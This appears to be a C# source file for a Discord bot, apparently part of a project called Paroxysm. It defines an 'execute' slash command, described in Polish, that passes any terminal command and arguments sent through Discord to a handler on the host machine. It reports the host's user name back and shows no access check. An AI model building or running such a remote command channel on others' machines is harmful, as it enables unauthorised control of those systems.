using Discord;
using Discord.WebSocket;
using Paroxysm.Discord.Commands.Models;
using Paroxysm.Hooks.Actions;

namespace Paroxysm.Discord.Commands;

public class ExecuteCmd : ISlashCommand
{
    public SlashCommandOptions Options()
    {
        return new SlashCommandOptions
        {
            Name = "execute",
            Description = "Używa komendy w konsoli",
            Params = new[] { new SlashCommandOptionParams
            {
                Name = "command",
                Description = "Komenda do wykonania z terminalu",
                Type = ApplicationCommandOptionType.String,
                IsRequired = true
            }, new SlashCommandOptionParams
            {
                Name = "args",
                Description = "Argumenty do komendy",
                Type = ApplicationCommandOptionType.String,
                IsRequired = false
            }
            }
        };
    }

    public Embed Execute(SocketSlashCommand slashCommand)
    {
        var parameters = slashCommand.Data;

        var executeCommand = parameters?.Options.ToList();
        if (executeCommand is null)
        {
            return DiscordEmbed.CreateWithText(Color.Red, "Command executed with errors",
                "Unknown option parameters.", Environment.UserName, null);
        }

        return ExecuteCommandAction.Follow(executeCommand);
    }
}